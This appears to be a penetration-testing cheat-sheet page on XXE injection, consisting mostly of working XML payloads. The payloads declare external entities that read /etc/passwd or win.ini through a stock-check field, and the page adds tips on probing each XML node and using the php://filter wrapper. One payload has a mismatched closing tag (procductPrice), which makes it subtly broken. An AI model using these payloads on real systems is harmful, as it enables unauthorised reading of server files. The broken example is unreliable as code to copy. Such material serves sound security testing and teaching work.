# XXE (XML External Entity)

## XXE to retrieve files

{% code title="Normal XML" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
{% endcode %}

{% tabs %}
{% tab title="#1" %}
This XXE payload defines an external entity **\&xxe;** whose value is the contents of the **/etc/passwd** file and uses the entity within the value of the **productId**.

{% hint style="info" %}
Windows payload: `file:///c:/windows/win.ini`
{% endhint %}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
{% endtab %}

{% tab title="#2" %}
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```
{% endtab %}
{% endtabs %}

### Tips

* With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to **test each data node in the XML individually**, by making use of your defined entity and seeing whether it appears within the response. Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <productName>Test</productName>
    <productPrice>12</procductPrice>
</stockCheck>
```

* Remember to change wrappers. [Here](../inclusion-lfi-rfi-traversal/php-wrappers.md#wrappers) is a complete list. The **php://filter** wrapper with **base64** encoding can be very useful.
